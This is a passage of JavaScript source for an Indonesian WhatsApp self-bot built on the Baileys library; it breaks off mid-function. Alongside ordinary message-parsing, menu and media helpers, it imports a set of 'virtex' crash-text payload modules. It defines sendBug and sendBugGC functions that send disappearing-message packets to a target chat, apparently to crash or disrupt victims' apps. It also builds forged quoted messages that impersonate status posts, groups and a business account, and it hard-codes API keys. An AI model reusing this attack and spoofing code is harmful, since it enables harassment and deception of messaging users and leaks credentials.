const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ReclientectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
  prepareMessageFromContent, 
  relayWAMessage,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const { virtex, vipi } = require("./lib/virtex.js"); //memans
const hx = require("hxz-api");
const yo = require("tod-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const FormData = require('form-data');
const imgbb = require('imgbb-uploader');
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const brainly = require("brainly-scraper");
const yts = require("yt-search");
const ms = require("parse-ms");
const toMs = require("ms");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { downloadMenu, infoMenu, gameMenu, groupMenu, funMenu, wibuMenu, ownerMenu, stickerMenu, otherMenu, rulesBot } = require('./lib/help.js');
const { color, bgcolor } = require("./lib/color");
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { antibuggc } = require('./lib/antibuggc');
const { syntaxhole } = require('./lib/syntaxhole');
const { bugtroli } = require('./lib/bugtroli');
const { virtex2 } = require('./virtex/virtex2');
const { virtex3 } = require('./virtex/virtex3');
const { virtex4 } = require('./virtex/virtex4');
const { virtex5 } = require('./virtex/virtex5');
const { virtex6 } = require('./virtex/virtex6');
const { virtex7 } = require('./virtex/virtex7');
const { virtex8 } = require('./virtex/virtex8');
const { virtex9 } = require('./virtex/virtex9');
const { ngazap } = require('./virtex/ngazap');
const { emoji2 } = require('./virtex/emoji2');
const { virtag } = require('./virtex/virtag');
const { webp2mp4File } = require("./lib/webp2mp4");
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js");
const { mediafireDl } = require('./lib/mediafire.js');
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const { addVote, delVote } = require("./lib/vote");
const reminder = require("./lib/reminder");
const { allmenu } = require('./lib/allmenu');
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const Exif = require('./lib/exif');
const exif = new Exif();
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
const htod = "6285609217332@s.whatsapp.net"

banChats = true;
offline = false;
namabot = '𝚇𝚝𝚛𝚎𝚊𝚖-𝙱𝚘𝚝';
nobot = '6285609217332';
namaowner = 'ꪶ𖣂ꫂ IDO ボ GANZ 〽';
namaowner2 = 'ꪶ𖣂ꫂ IDO ボ RANI〽';
targetpc = "6285609217332";
owner = "6285609217332";
fake = "ꪶ𖣂ꫂ IDO ボ GANZ 〽";
baper = "6285609217332@s.whatsapp.net";
aread = false
antitrol = true 
bugc = true
autovn = true
antidel = false
autoketik = false
thumb = fs.readFileSync("./lib/logo.jpeg");
numbernye = "0";
waktu = "-";
alasan = "-";
autojoin = false;
prefixStatus = true;
hit_today = [];

//apikey
LolHuman = '2d3962dbfca3fd4a7f6f9348'
lolkey = 'genbotkey'
XteamKey = 'b6923d4a764d6b45927a0099'
LeysApi = 'IkyOgiwara'
jann = 'ojan' 

const vcard = 'BEGIN:VCARD\n' // jangan ganti
            + 'VERSION:3.0\n' // biarin aja 
            + 'FN:idoganz\n' // ganti aja 
            + 'ORG: idoganz;\n' // ganti aja
            + 'TEL;type=CELL;type=VOICE;waid=6285609217332:+6285609217332\n'  //ganti nomor lu
            + 'END:VCARD' // jangan ganti            
//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));

// Sticker Cmd
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};

const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = client = async (client, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
    const type = Object.keys(mek.message)[0];
    1;
    var prefixRegEx = /^[!&z?=#.+\/]/gi;
    let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
       : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "listResponseMessage" && mek.message.listResponseMessage.title
        ? mek.message.listResponseMessage.title                    
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
    let prefix = _chats.match(prefixRegEx) ? prefixRegEx.exec(_chats)[0] : "";
    body =
      type === "conversation" && mek.message.conversation.startsWith(prefix)
        ? mek.message.conversation
        : type == "imageMessage" &&
          mek.message.imageMessage.caption.startsWith(prefix)
        ? mek.message.imageMessage.caption
        : type == "videoMessage" &&
          mek.message.videoMessage.caption.startsWith(prefix)
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" &&
          mek.message.extendedTextMessage.text.startsWith(prefix)
        ? mek.message.extendedTextMessage.text
        : "";
    budy =
      type === "conversation"
        ? mek.message.conversation
        : type === "extendedTextMessage"
        ? mek.message.extendedTextMessage.text
        : "";
    let chats = _chats.match(prefixRegEx)
      ? _chats
          .split(prefixRegEx)
          .find((v) => v === _chats.replace(prefixRegEx, ""))
      : _chats;
    let command = chats.split(/ +/g)[0];
    hit_today.push(command);
    const args = _chats.trim().split(/ +/).slice(1);
    const arg = chats.slice(command.length + 2, chats.length);
const argss = body.split(/ +/g);
    const isCmd = _chats.match(prefixRegEx)
      ? prefixRegEx.exec(_chats)["input"]
      : _chats;
    const q = args.join(" ");
    const botNumber = client.user.jid;
    const botNumberss = client.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;	
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;

    const sender = mek.key.fromMe
      ? client.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? client.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    // const isSelfNumber = config.NomorSELF
    // const isOwner = sender.id === isSelfNumber
    const totalchat = await client.chats.all();
    const m = simple.smsg(client, mek);
    const groupMetadata = isGroup ? await client.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isVote = isGroup ? voting.includes(from) : false;   
    const conts = mek.key.fromMe
      ? client.user.jid
      : client.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? client.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;
    //Y
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
    const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam";
    }

    //MESS
    mess = {
      wait: "[ ! ] 𝚆𝙰𝙸𝚃 𝙼𝙰𝚂𝙸𝙷 𝙿𝚁𝙾𝚂𝙴𝚂....",
      success: "𝙳𝙾𝙽𝙴 ...",
      wrongFormat: "Format salah, coba liat lagi di menu",
      error: {
        stick: "bukan sticker itu:v",
        Iv: "Linknya error:v",
      },
      only: {
        group: "Khusus grup ngab",
      },
    };

const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = client.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "𝐊𝐥𝐢𝐤 𝐃𝐢𝐬𝐢𝐧𝐢 ⌕","footerText": "ꪶ𖣂ꫂ IDO ボ GANZ 〽💉","listType": "SINGLE_SELECT","sections": list}}, {})
            return client.relayWAMessage(po, {waitForAck: true})
        }
    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };

    const dap1 = ['1','2','3','4','5','6','7','8','9']
            const dap2 = ['1','2','3','4','5','6','7','8','9']
            const dap3 = dap1[Math.floor(Math.random() * (dap1.length))]
            const dap4 = dap2[Math.floor(Math.random() * (dap2.length))]
    const reply = (teks) => {
      client.sendMessage(from, teks, text, { quoted: mek });
    };

    const sendMess = (hehe, teks) => {
      client.sendMessage(hehe, teks, text);
    };

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? client.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : client.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };

    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289523258649-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 999999,
          status: 99999,
          thumbnail: thumb,
          surface: 99999,
          message: fake,
          orderTitle: "ꪶ𖣂ꫂ IDO ボ GANZ 〽.",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,    
    };
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 99999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      client.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      client.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      client.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            client.sendMessage(to, media, MessageType.sticker, { quoted: mek });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`), //Gambarnye
            },
            title: "ꪶ𖣂ꫂ IDO ボ GANZ 〽-Fakereply", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "YogiPw",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };   									
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }       
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        client.sendMessage(to, media, type, {
          quoted: mek,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
    const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      client.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButImage = async (
      id,
      text1,
      desc1,
      gam1,
      but = [],
      options = {}
    ) => {
      kma = gam1;
      mhan = await client.prepareMessage(from, kma, image);
      const buttonMessages = {
        imageMessage: mhan.message.imageMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 4,
      };
      client.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButVideo = async (
      id,
      text1,
      desc1,
      vid1,
      but = [],
      options = {}
    ) => {
      kma = vid1;
      mhan = await client.prepareMessage(from, kma, video);
      const buttonMessages = {
        videoMessage: mhan.message.videoMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 5,
      };
      client.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        client.groupRemove(from, [i]);
      }
    };   
    const add = function (from, orangnya) {
      client.groupAdd(from, orangnya);
    };
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await client.relayWAMessage(
        client.prepareMessageFromContent(
          target,
          client.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      client.sendMessage(target, teks, "conversation");
    };
    const sendBugGC = (jid, ephemeralExpiration, opts) => {
            const message = client.prepareMessageFromContent(
                jid,
                client.prepareDisappearingMessageSettingContent(ephemeralExpiration),
                {}
            )
                client.relayWAMessage(message, opts)
            return message }   

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (isAfk(mek.key.remoteJid)) return;
        addafk(mek.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        client.sendMessage(
          mek.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi owner Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                },
              },
            },
          }
        );
      }
    }
    const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await client.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
client.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
    if (mek.key.remoteJid.endsWith("@g.us") && offline) {
      if (!mek.key.fromMe) {
        if (mek.message.extendedTextMessage != undefined) {
          if (mek.message.extendedTextMessage.contextInfo != undefined) {
            if (
              mek.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of mek.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
